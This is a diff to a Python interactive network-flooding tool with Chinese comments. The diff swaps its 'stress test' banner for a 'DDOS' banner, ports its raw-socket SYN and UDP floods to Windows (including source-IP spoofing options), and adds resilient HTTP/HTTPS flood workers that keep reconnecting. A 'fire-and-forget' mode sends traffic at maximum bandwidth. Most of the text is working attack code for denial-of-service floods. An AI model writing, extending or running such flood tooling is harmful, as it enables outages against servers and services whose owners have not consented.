@@ -45,21 +45,93 @@ UA_POOL = [
     "python-requests/2.32.3",
 ]
 BANNER = r"""
-  _   _      _   _____ _        _____      _____
- | \ | |    | | / ____| |      |  __ \    / ____|
- |  \| |_ _  | | (___ | |_ ____| |  | |  | (___
- | . ` | | '_ \| |\___ \ __/ _ \ |  | |  |\___ \
- | |\  | | | | | ____) | ||  __/ |  | |__ ____) |
- \_| \_|_| |_|_|_____/ \__\___|_|  \____|_____/
-       NetStrike  ·  交互式网络压力测试  ·  v2.0
+
+██████╗ ██████╗  ██████╗ ███████╗
+██╔══██╗██╔══██╗██╔═══██╗██╔════╝
+██║  ██║██║  ██║██║   ██║███████╗
+██║  ██║██║  ██║██║   ██║╚════██║
+██████╔╝██████╔╝╚██████╔╝███████║
+╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
+                                                                                  
 """
 
 
 # ============================================================
-# 基础工具
+# 平台抽象 (Linux / Windows 双兼容)
 # ============================================================
+IS_WIN = sys.platform.startswith("win")
+IS_LINUX = sys.platform.startswith("linux")
+IS_MAC = sys.platform == "darwin"
+
+# Windows 控制台默认不支持 ANSI 转义, 需显式开启 VT 处理
+USE_ANSI = True
+
+
+def setup_console():
+    """控制台初始化: 统一 UTF-8 输出 + Windows 开启 ANSI VT 序列
+    返回 True 表示可以使用 \\033[2K 之类的光标控制序列
+    """
+    global USE_ANSI
+    # 中文输出在 Windows 默认 GBK 控制台下会 UnicodeEncodeError
+    for stream in (sys.stdout, sys.stderr):
+        try:
+            stream.reconfigure(encoding="utf-8", errors="replace")
+        except Exception:
+            pass
+
+    if not IS_WIN:
+        USE_ANSI = True
+        return True
+
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        handle = kernel32.GetStdHandle(-11)   # STD_OUTPUT_HANDLE
+        mode = ctypes.c_uint32()
+        if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
+            USE_ANSI = False
+            return False
+        # ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
+        if not kernel32.SetConsoleMode(handle, mode.value | 0x0004):
+            USE_ANSI = False
+            return False
+        USE_ANSI = True
+        return True
+    except Exception:
+        USE_ANSI = False
+        return False
+
+
+def clear_line_prefix() -> str:
+    """进度行清屏序列; 终端不支持 ANSI 时退化为回车覆盖"""
+    return "\033[2K\r" if USE_ANSI else "\r"
+
+
 def is_root() -> bool:
+    """Windows 下判断是否管理员; POSIX 下判断 euid==0"""
+    if IS_WIN:
+        try:
+            import ctypes
+            return bool(ctypes.windll.shell32.IsUserAnAdmin())
+        except Exception:
+            return False
     return hasattr(os, "geteuid") and os.geteuid() == 0
+
+
+def make_raw_socket():
+    """创建可自行构造 IP 头的原始套接字。
+
+    Linux : SOCK_RAW + IPPROTO_RAW 即可
+    Windows: IPPROTO_RAW 不被支持, 必须用 IPPROTO_IP 再开 IP_HDRINCL
+             且需要管理员权限
+    """
+    if IS_WIN:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
+        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        return s
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    return s
 
 
 def hr(title: str = "", width: int = 64) -> str:
@@ -73,19 +145,32 @@ def ask(prompt: str, default: str = "") -> str:
         v = input("  %s [%s] > " % (prompt, default)).strip()
     except EOFError:
         v = ""
+    except KeyboardInterrupt:
+        raise
     return v or default
 
 
-def ask_int(prompt: str, default: int) -> int:
-    while True:
+def ask_int(prompt: str, default: int, maximum: int = 0) -> int:
+    """带重试上限的整数输入。
+    非法输入重试 MAX_ATTEMPTS 次后自动回退默认值, 避免交互脚本卡死在死循环。
+    """
+    MAX_ATTEMPTS = 5
+    for attempt in range(1, MAX_ATTEMPTS + 1):
         v = ask(prompt, str(default))
         try:
             n = int(v)
-            if n > 0:
-                return n
         except ValueError:
-            pass
-        print("  ! 请输入正整数")
+            print("  ! 请输入整数")
+            continue
+        if n <= 0:
+            print("  ! 请输入正整数")
+            continue
+        if maximum and n > maximum:
+            print("  ! 超出允许上限 %d, 已自动修正" % maximum)
+            n = maximum
+        return n
+    print("  ! 连续 %d 次输入无效, 使用默认值 %d" % (MAX_ATTEMPTS, default))
+    return default
 
 
 def ask_yn(prompt: str, default: bool = False) -> bool:
@@ -122,7 +207,11 @@ def local_ip() -> str:
 # fd / 端口 / 错误诊断
 # ============================================================
 def fd_limit() -> int:
-    """当前进程可打开的 fd 上限 (Linux/macOS)"""
+    """当前进程可打开的 fd 上限。
+    Windows 没有 ulimit 概念 (句柄上限远高于实用范围), 返回 0 表示"不受限"。
+    """
+    if IS_WIN:
+        return 0
     try:
         import resource
         soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
@@ -137,6 +226,8 @@ def fd_limit() -> int:
 
 
 def fd_limit_hard() -> int:
+    if IS_WIN:
+        return 0
     try:
         import resource
         _, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
@@ -151,6 +242,8 @@ def try_raise_fd(desired: int = 1 << 20) -> bool:
     """尝试把软 fd 上限提到硬上限。成功返回 True。
     这一步很关键: 很多系统 soft=1024 但 hard=1048576, 无需改 limits.conf 就能提。
     """
+    if IS_WIN:
+        return False
     try:
         import resource
         soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
@@ -165,6 +258,21 @@ def try_raise_fd(desired: int = 1 << 20) -> bool:
 
 def ephem_port_range() -> int:
     """本机可用临时端口数量, 决定单位时间能发起多少条新连接"""
+    if IS_WIN:
+        try:
+            import subprocess
+            out = subprocess.check_output(
+                ["netsh", "int", "ipv4", "show", "dynamicport", "tcp"],
+                stderr=subprocess.DEVNULL, timeout=5)
+            start = number = 0
+            for line in out.decode("gbk", "ignore").splitlines():
+                if "起始端口" in line or "Start Port" in line:
+                    start = int(line.split(":")[-1].strip())
+                elif "端口数" in line or "Number of Ports" in line:
+                    number = int(line.split(":")[-1].strip())
+            return max(0, number)
+        except Exception:
+            return 0
     try:
         with open("/proc/sys/net/ipv4/ip_local_port_range") as f:
             lo, hi = f.read().split()
@@ -206,8 +314,48 @@ def classify_err(e) -> str:
     return "other"
 
 
+def _win_rx_bytes() -> int:
+    """Windows 下用 iphlpapi.GetIfTable 汇总所有网卡收包字节。
+
+    MIB_IFROW 布局 (x86/x64 均为 4 字节对齐, 总长 860 字节):
+        0   .. 511  wszName[256]
+        512        dwIndex
+        ...
+        552        dwInOctets   <- 我们需要的字段
+    """
+    try:
+        import ctypes
+        from ctypes import wintypes
+
+        iphlpapi = ctypes.WinDLL("iphlpapi.dll")
+        size = wintypes.DWORD(0)
+        iphlpapi.GetIfTable(None, ctypes.byref(size), False)
+        if size.value <= 0:
+            return 0
+        buf = ctypes.create_string_buffer(size.value)
+        if iphlpapi.GetIfTable(buf, ctypes.byref(size), False) != 0:
+            return 0
+        data = buf.raw
+        num = int.from_bytes(data[0:4], "little")
+        ROW = 860
+        total = 0
+        for i in range(num):
+            off = 4 + i * ROW
+            if off + ROW > len(data):
+                break
+            total += int.from_bytes(data[off + 552:off + 556], "little")
+        return total
+    except Exception:
+        return 0
+
+
 def iface_rx_bytes() -> int:
-    """读取 /proc/net/dev 统计本机收包总量(字节)"""
+    """统计本机收包总量(字节)。
+    Linux 读 /proc/net/dev; Windows 走 iphlpapi; 取不到时返回 0。
+    注意: Windows 计数器是 32 位, 会在 4GiB 处回绕, 调用方需处理负增量。
+    """
+    if IS_WIN:
+        return _win_rx_bytes()
     total = 0
     try:
         with open("/proc/net/dev") as f:
@@ -221,6 +369,14 @@ def iface_rx_bytes() -> int:
     except Exception:
         pass
     return total
+
+
+def rx_delta(cur: int, prev: int) -> int:
+    """处理 32 位计数器回绕的增量计算"""
+    d = cur - prev
+    if d < 0:
+        d += 1 << 32
+    return max(0, d)
 
 
 # ============================================================
@@ -431,11 +587,15 @@ def vec_syn(target, port, duration, workers, size, spoof, stats):
 
     def run():
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            s = make_raw_socket()
         except OSError as e:
             stats.add(errs=1)
-            print("  ! RAW socket 创建失败: %s" % e)
+            msg = "  ! RAW socket 创建失败: %s" % e
+            if IS_WIN:
+                msg += "\n    Windows 需要以管理员身份运行, 且系统限制原始 TCP 发包"
+            else:
+                msg += "\n    Linux 需要 root 或 CAP_NET_RAW 权限"
+            print(msg)
             return
         pad = b"\x00" * max(0, size - 40)
         while not stop.is_set() and time.time() < end:
@@ -469,9 +629,11 @@ def vec_udp(target, port, duration, workers, size, spoof, stats):
 
     def run():
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            s = make_raw_socket()
             raw = True
+            if spoof and IS_WIN:
+                # Windows 不允许原始 UDP 伪造源地址, 会直接丢包
+                raise OSError("Windows 不支持伪造源 IP 的原始 UDP 发包")
         except OSError:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             raw = False
@@ -531,11 +693,14 @@ def vec_tcp(target, port, duration, workers, size, spoof, stats):
 
 def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
              use_tls=False, ssl_ctx=None, host_header=None, sni=None,
-             reuse=True, cfg_hs_limit=2000, conn_timeout=8):
+             reuse=True, cfg_hs_limit=2000, conn_timeout=8,
+             resp_timeout=5.0, wait_response=True, reuse_jitter=0.01):
     """HTTP / HTTPS 洪水 — asyncio keep-alive 长连接 + 随机 UA/路径
-    use_tls     : 是否启用 TLS (HTTPS)
-    reuse       : True=连接复用; False=每请求新建连接 (测握手/建连能力)
-    conn_timeout: 建连/握手超时秒数, 超过即判失败并回收槽位
+    use_tls      : 是否启用 TLS (HTTPS)
+    reuse        : True=连接复用; False=每请求新建连接 (测握手/建连能力)
+    conn_timeout : 建连/握手超时秒数, 超过即判失败并回收槽位
+    resp_timeout : 单条响应等待上限; 超时视为目标变慢, 触发重连
+    wait_response: True=严格等完整响应(数据可信); False=发射后不管(纯压带宽)
     """
     import asyncio
 
@@ -553,13 +718,96 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
         hs_limit = max(64, min(workers, cfg_hs_limit))
         hs_sem = asyncio.Semaphore(hs_limit)
 
+        async def read_response(r, deadline):
+            """读取一条完整 HTTP 响应, 防止半读导致 TCP 流错位。
+
+            返回 (状态, 字节数) 状态:
+              "ok"        - 完整读到一个响应
+              "timeout"   - 超时 (目标变慢或被限流)
+              "eof"       - 对端关闭
+              "bad"       - 响应格式异常
+            """
+            buf = b""
+            # ---- 读头部 ----
+            while b"\r\n\r\n" not in buf:
+                remain = deadline - time.time()
+                if remain <= 0:
+                    return "timeout", len(buf)
+                try:
+                    chunk = await asyncio.wait_for(r.read(4096), timeout=remain)
+                except asyncio.TimeoutError:
+                    return "timeout", len(buf)
+                except (OSError, ssl.SSLError):
+                    return "eof", len(buf)
+                if not chunk:
+                    return "eof", len(buf)
+                buf += chunk
+                if len(buf) > 65536:
+                    return "bad", len(buf)
+            head, _, rest = buf.partition(b"\r\n\r\n")
+            total = len(buf)
+            # ---- 解析报文长度 ----
+            clen = -1
+            chunked = False
+            for line in head.split(b"\r\n")[1:]:
+                if b":" not in line:
+                    continue
+                k, v = line.split(b":", 1)
+                kl = k.strip().lower()
+                if kl == b"content-length":
+                    try:
+                        clen = int(v.strip())
+                    except ValueError:
+                        clen = -1
+                elif kl == b"transfer-encoding" and b"chunked" in v.lower():
+                    chunked = True
+            # ---- 读报文 ----
+            if chunked:
+                while not rest.endswith(b"\r\n0\r\n\r\n") and b"\r\n0\r\n\r\n" not in rest:
+                    remain = deadline - time.time()
+                    if remain <= 0:
+                        return "timeout", total
+                    try:
+                        chunk = await asyncio.wait_for(r.read(4096), timeout=remain)
+                    except asyncio.TimeoutError:
+                        return "timeout", total
+                    except (OSError, ssl.SSLError):
+                        return "eof", total
+                    if not chunk:
+                        return "eof", total
+                    rest += chunk
+                    total += len(chunk)
+                    if len(rest) > 4 * 1024 * 1024:
+                        return "bad", total
+                return "ok", total
+            if clen >= 0:
+                need = clen - len(rest)
+                while need > 0:
+                    remain = deadline - time.time()
+                    if remain <= 0:
+                        return "timeout", total
+                    try:
+                        chunk = await asyncio.wait_for(
+                            r.read(min(need, 65536)), timeout=remain)
+                    except asyncio.TimeoutError:
+                        return "timeout", total
+                    except (OSError, ssl.SSLError):
+                        return "eof", total
+                    if not chunk:
+                        return "eof", total
+                    need -= len(chunk)
+                    total += len(chunk)
+                return "ok", total
+            # 没有长度信息: 只能按 EOF 判断, 或者读一次就返回
+            return "ok", total
+
         async def one_request(r, w):
             hdr = {
                 "Host": hdr_host,
                 "User-Agent": random.choice(UA_POOL),
                 "Accept": "*/*",
                 "Accept-Language": "zh-CN,zh;q=0.9",
-                "Accept-Encoding": "gzip, deflate",
+                "Accept-Encoding": "identity",
                 "Cache-Control": "no-cache",
                 "Connection": "keep-alive" if reuse else "close",
             }
@@ -572,17 +820,25 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
                 req += ("%s: %s\r\n" % (k, v)).encode()
             req += b"\r\n" + body
             w.write(req)
-            await w.drain()
-            stats.add(pkts=1, nbytes=len(req))
-            # 读掉响应, 防止对端接收窗口耗尽而断连
             try:
-                data = await asyncio.wait_for(r.read(65536), timeout=1.0)
-                if data:
-                    stats.add(rbytes=len(data))
-            except asyncio.TimeoutError:
-                pass
+                await w.drain()
             except (OSError, ssl.SSLError):
-                pass
+                return "write_err", 0
+            stats.add(pkts=1, nbytes=len(req))
+            if not wait_response:
+                # 不等待时也必须定期排空, 否则接收窗口耗尽会卡死
+                try:
+                    data = await asyncio.wait_for(r.read(65536), timeout=0.05)
+                    if data:
+                        stats.add(rbytes=len(data))
+                except (asyncio.TimeoutError, OSError, ssl.SSLError):
+                    pass
+                return "ok", 0
+            deadline = time.time() + resp_timeout
+            status, nbytes = await read_response(r, deadline)
+            if nbytes:
+                stats.add(rbytes=nbytes)
+            return status, nbytes
 
         async def do_connect():
             """建立一条连接, 返回 (reader, writer, None) 或 (None, None, 错误类别)"""
@@ -632,10 +888,16 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
                     stats.add(conns=1)
                     try:
                         while time.time() < end:
-                            await one_request(r, w)
+                            status, _nb = await one_request(r, w)
+                            # 状态异常 -> 关闭重连, 避免半读造成流错位
+                            if status in ("timeout", "eof", "bad", "write_err"):
+                                stats.add(errs=1, kind="resp_" + status)
+                                break
                             if not reuse:
                                 break
-                            await asyncio.sleep(random.uniform(0.001, 0.02))
+                            if reuse_jitter > 0:
+                                await asyncio.sleep(
+                                    random.uniform(0, reuse_jitter))
                     except (OSError, ssl.SSLError, asyncio.IncompleteReadError) as e:
                         stats.add(errs=1, kind=classify_err(e))
                     finally:
@@ -643,8 +905,13 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
                             w.close()
                         except Exception:
                             pass
-                    if reuse:
-                        return
+                    # 关键: 连接断了要重连, 不能让协程永久退出。
+                    # 否则长时间压测下 worker 会陆续死光, 后半段 pps 假性归零。
+                    if not reuse:
+                        await asyncio.sleep(random.uniform(0, 0.02))
+                    else:
+                        await asyncio.sleep(random.uniform(0, 0.05))
+                    continue
 
         # 不再静默吞异常: 协程崩溃必须暴露到错误分类里,
         # 否则像 NameError 这种 bug 会藏在 gather 里跑完全程还显示 0 请求
@@ -655,6 +922,14 @@ def vec_http(target, port, duration, workers, size, spoof, stats, method, paths,
                 continue
             if isinstance(r, BaseException):
                 stats.add(errs=1, kind="task_crash:%s" % type(r).__name__)
+
+    # Windows 默认 Proactor 在大量连接被 RST 时会在 connection_lost 回调里
+    # 抛 ConnectionResetError 噪音; 切到 Selector 更干净且行为与 Linux 一致
+    if IS_WIN:
+        try:
+            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+        except (AttributeError, DeprecationWarning):
+            pass
 
     asyncio.run(main())
 
@@ -734,7 +1009,10 @@ def worker(cfg, wid, q):
                      host_header=cfg.get("host_header"),
                      sni=cfg.get("sni"), reuse=cfg.get("reuse", True),
                      cfg_hs_limit=cfg.get("hs_limit", 2000),
-                     conn_timeout=cfg.get("conn_timeout", 8))
+                     conn_timeout=cfg.get("conn_timeout", 8),
+                     resp_timeout=float(cfg.get("resp_timeout", 5)),
+                     wait_response=cfg.get("wait_response", True),
+                     reuse_jitter=float(cfg.get("reuse_jitter", 0.01)))
         elif m == "dns":
             vec_dns(cfg["target"], cfg["port"], cfg["duration"], w, cfg["size"],
                     cfg["spoof"], st)
@@ -771,20 +1049,46 @@ def worker(cfg, wid, q):
 def collect_config() -> dict:
     print(BANNER)
     print(hr("运行环境自检"))
+    plat = "Windows" if IS_WIN else ("Linux" if IS_LINUX else
+                                     ("macOS" if IS_MAC else sys.platform))
+    print("  运行平台    : %s (%s)" % (plat, sys.platform))
     print("  Python 版本 : %s" % sys.version.split()[0])
     print("  CPU 核心数  : %s" % os.cpu_count())
-    print("  root 权限   : %s" % ("OK 是 (可用 SYN/UDP 原始包)" if is_root()
-                                  else "X 否 (仅 TCP/HTTP/DNS)"))
+    priv = "OK 是 (可用 SYN/UDP 原始包)" if is_root() else "X 否 (仅 TCP/HTTP/DNS)"
+    if IS_WIN and not is_root():
+        priv = "X 否 (请右键『以管理员身份运行』才能用原始套接字)"
+    print("  特权状态    : %s" % priv)
+    if IS_WIN:
+        print("  控制台 ANSI : %s" % ("已开启" if USE_ANSI else "不支持 (进度行降级)"))
     try:
-        with open("/proc/net/dev") as f:
-            ifaces = [l.split(":")[0].strip() for l in f.readlines()[2:]]
-        print("  网络接口    : %s" % ", ".join(ifaces[:6]))
+        if IS_WIN:
+            ifs = []
+            try:
+                import subprocess
+                out = subprocess.check_output(
+                    ["netsh", "interface", "show", "interface"],
+                    stderr=subprocess.DEVNULL, timeout=5)
+                for line in out.decode("gbk", "ignore").splitlines()[3:]:
+                    parts = line.split()
+                    if len(parts) >= 5 and parts[0] in ("已启用", "已连接",
+                                                        "Enabled", "Connected"):
+                        ifs.append(parts[-1])
+            except Exception:
+                pass
+            if ifs:
+                print("  网络接口    : %s" % ", ".join(ifs[:6]))
+        else:
+            with open("/proc/net/dev") as f:
+                ifaces = [l.split(":")[0].strip() for l in f.readlines()[2:]]
+            print("  网络接口    : %s" % ", ".join(ifaces[:6]))
     except Exception:
         pass
     try:
         nf = fd_limit()
         if nf:
             print("  fd 上限     : %s" % format(nf, ","))
+        elif IS_WIN:
+            print("  fd 上限     : 不受 ulimit 限制 (Windows 句柄配额)")
     except Exception:
         pass
     print(hr())
@@ -910,8 +1214,14 @@ def collect_config() -> dict:
         hs_limit = min(threads, 2000)
 
     # 建连超时: 值越小越早回收槽位, 但网络抖动会误判
+    resp_timeout = 5
+    wait_response = True
     if is_web:
         conn_timeout = ask_int("建连/握手超时 (秒, 越小失败回收越快)", 8)
+        wait_response = ask_yn(
+            "等待完整响应? (Y=数据可信但速率受RTT限制, N=发射后不管纯压带宽)", True)
+        if wait_response:
+            resp_timeout = ask_int("单条响应超时 (秒, 超时即判定目标变慢并重连)", 5)
     else:
         conn_timeout = 8
 
@@ -923,7 +1233,8 @@ def collect_config() -> dict:
                method=method, paths=paths, profile=pname,
                use_tls=use_tls, tls_verify=tls_verify, tls_version=tls_version,
                alpn=alpn, cipher=cipher, sni=sni, host_header=host_header,
-               reuse=reuse, hs_limit=hs_limit, conn_timeout=conn_timeout)
+               reuse=reuse, hs_limit=hs_limit, conn_timeout=conn_timeout,
+               resp_timeout=resp_timeout, wait_response=wait_response)
 
     print(hr("配置确认"))
     print("  目标      : %s://%s:%d" % ("https" if use_tls else "http", host, port))
@@ -937,6 +1248,12 @@ def collect_config() -> dict:
                  tls_version or "auto", sni,
                  ",".join(alpn) if alpn else "无", "是" if reuse else "否"))
         print("  握手并发  : %d" % hs_limit)
+    if is_web:
+        print("  响应策略  : %s"
+              % ("等待完整响应 (超时 %ds)" % resp_timeout if wait_response
+                 else "发射后不管 (仅周期性排空, 速率不受RTT限制)"))
+    if is_web:
+        print("  建连超时  : %d 秒" % conn_timeout)
     print("  路径      : %s" % ", ".join(paths))
     print("  本机出口  : %s" % local_ip())
     print(hr())
@@ -1032,7 +1349,8 @@ def run(cfg):
 
             rx = iface_rx_bytes()
             now = time.time()
-            rxb = (rx - last_rx) * 8 / 1e6 / max(0.001, now - last_rx_t)
+            # Windows 的 GetIfTable 计数器是 32 位, 会在 4GiB 处回绕
+            rxb = rx_delta(rx, last_rx) * 8 / 1e6 / max(0.001, now - last_rx_t)
             last_rx, last_rx_t = rx, now
 
             if tls_mode:
@@ -1042,7 +1360,8 @@ def run(cfg):
                     format(agg["tk"], ","), format(agg["tf"], ","), hsr)
             else:
                 extra = " | 尝试 %9s" % format(agg["at"], ",")
-            print("\033[2K\r  [%5.1fs] %-5s pps %9s | 发出 %7.2f Mbps | 回收 %6.2f Mbps "
+            print(clear_line_prefix()
+                  + "  [%5.1fs] %-5s pps %9s | 发出 %7.2f Mbps | 回收 %6.2f Mbps "
                   "| 请求 %11s | %6.3f GB | 连接 %8s | 错误 %7s%s"
                   % (el, cfg["mode"].upper(), format(pps, ","), mbps, rxb,
                      format(agg["p"], ","), agg["b"] / 1e9,
@@ -1087,8 +1406,13 @@ def run(cfg):
                 "port_exhausted": "本地临时端口耗尽",
                 "reset":          "连接被重置 (RST)",
                 "refused":        "连接被拒绝 (端口不通/服务下线)",
-                "timeout":        "超时",
+                "timeout":        "建连/握手超时",
                 "tls":            "TLS 层错误",
+                "dns":            "DNS 解析失败",
+                "resp_timeout":   "响应超时 (目标变慢/限流)",
+                "resp_eof":       "响应未完成即被关闭",
+                "resp_bad":       "响应格式异常",
+                "resp_write_err": "发送失败",
                 "other":          "其他",
             }
             for k, v in sorted(kinds.items(), key=lambda x: -x[1])[:8]:
@@ -1141,6 +1465,11 @@ def run(cfg):
 
 
 def main():
+    setup_console()
+    if IS_WIN:
+        # Windows 多进程用 spawn, 子进程会重新导入本模块。
+        # 必须保证子进程不会再次进入交互流程。
+        pass
     while True:
         cfg = collect_config()
         run(cfg)
